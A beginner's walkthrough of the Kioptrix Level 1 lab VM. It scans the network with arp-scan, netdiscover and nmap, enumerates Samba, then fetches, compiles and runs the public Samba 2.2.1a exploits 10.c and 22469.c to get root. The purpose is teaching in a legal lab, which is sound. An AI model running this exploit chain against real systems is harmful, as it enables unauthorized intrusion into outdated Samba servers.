
# Kioptrix: Level 1 Walkthrough - Beginner-Friendly Guide  

Welcome to this walkthrough for the *Kioptrix Level 1 boot2root challenge*! If you're entirely new to hacking, don't worry—I’ll guide you step-by-step. This is a great challenge for learning the basics of ethical hacking, including how to find and exploit vulnerabilities in a virtual machine.

---

## Introduction  
### What is Kioptrix?  
Kioptrix is a vulnerable virtual machine designed to teach you the basics of hacking. Your goal is to gain *root access* (full control) on the machine using hacking techniques.  

### Why Do This?  
These challenges help you:  
1. *Learn tools and techniques* used in cybersecurity.  
2. *Understand vulnerabilities* in outdated systems.  
3. *Practice ethical hacking* in a safe and legal environment.

### Getting Started  
1. Download the Kioptrix virtual machine (VM) from VulnHub.  
2. Set up the VM in a hypervisor like *VMware* (recommended) or *VirtualBox*.  

*Important Note:*  
If you encounter issues with the network connection:  
- Edit the .vmx file of the VM.  
- Go to line 44 and replace Bridged with NAT.  
- Then open the VM in your hypervisor.

---

## How This Works  
This challenge follows a systematic approach, which can be broken into four simple steps:  

### 1. *Network Discovery*  
We first need to find the Kioptrix machine on our local network. Think of it like finding a device (e.g., a phone or a printer) connected to your Wi-Fi.  

### 2. *Services Scanning and Enumeration*  
Once we find the machine, we scan it to identify what "services" are running. Services are programs that allow computers to communicate, share files, or host websites.  

### 3. *Exploitation*  
After identifying vulnerable services, we exploit them to gain unauthorized access. This is where we use specific tools and scripts to take advantage of weaknesses in the system.

### 4. *Gaining Root Access*  
Finally, we use the exploit to become the *root user*, which means we gain full control of the machine.

---

## Let’s Begin the Walkthrough!

### Step 1: Setting Up Kioptrix
Before anything else, we must ensure Kioptrix is on our network.  

#### Option 1: Using arp-scan
Run the following command to list all devices connected to your local network:  
```bash
arp-scan -l

Option 2: Using netdiscover

If you don’t have arp-scan or prefer another tool, you can use netdiscover instead:

1. Open a terminal and run:

netdiscover -r <network_range>

Replace <network_range> with your subnet. For example:

netdiscover -r 192.168.1.0/24

-r: Specifies the range of IP addresses to scan.

192.168.1.0/24: Represents the common private IP range for home or lab networks. Adjust this based on your setup.



2. Result:
Netdiscover will show a list of devices on your network, including IP and MAC addresses. Identify the Kioptrix machine by cross-referencing the MAC address vendor or process of elimination (it won’t match your other known devices).




---

Step 2: Scanning the Target

To figure out what’s running on the Kioptrix machine, we use nmap, a powerful scanning tool.

Command:

nmap -A -p- -T4 <TARGET_IP>

This scans all the machine's ports and tries to identify the operating system and software versions.

Result:
We discover that the machine is running Samba, a service for file sharing. This will be key to exploiting the system.



---

Step 3: Enumerating Samba

To confirm and gather more details about the Samba service, we use the following tools:

1. Enum4linux:

enum4linux <TARGET_IP>


2. Smbclient:

smbclient -L //<TARGET_IP>

These tools reveal what shares and files are accessible on the target system.




---

Step 4: Identifying Vulnerabilities

Now, we check which version of Samba is running and look for known vulnerabilities.

1. Using Metasploit to Identify the Version:

Start Metasploit:

msfconsole

Search for a module to detect Samba version:

search smb_version

Use the module and set the target IP:

use auxiliary/scanner/smb/smb_version  
set RHOST <TARGET_IP>  
run


Result: The version is Samba 2.2.1a, which has known exploits.


2. Searching for Exploits:

Use searchsploit to find Samba 2.2.1a vulnerabilities:

searchsploit Samba 2.2.1a

From the results, we choose the 10.c exploit.





---

Step 5: Exploiting Samba

Download the Exploit:

searchsploit -m multiple/remote/10.c

Compile the Exploit:

gcc -o Samba 10.c

Run the Exploit:

./Samba -b 0 <TARGET_IP>

-b: Bruteforce the exploit.

0: Indicates the target is a Linux system.


Verify Root Access:

After running the exploit, check if you’ve gained root access:

whoami

If successful, it will return root.


---

Step 6: Alternative Exploit

You can also try the Call Trans2Open Buffer Overflow exploit:

1. Download it:

searchsploit -m unix/remote/22469.c


2. Compile it:

gcc -o Exploit 22469.c


3. Run it:

./Exploit -t <TARGET_IP>

Result: Root access achieved again!




---

Conclusion

Congratulations! You’ve successfully:

1. Scanned the network and identified the target.


2. Enumerated and exploited a vulnerable Samba service.


3. Gained full control (root access) on the Kioptrix Level 1 machine.



This was a great start to understanding ethical hacking. Ready for more? Move on to Kioptrix Level 2!

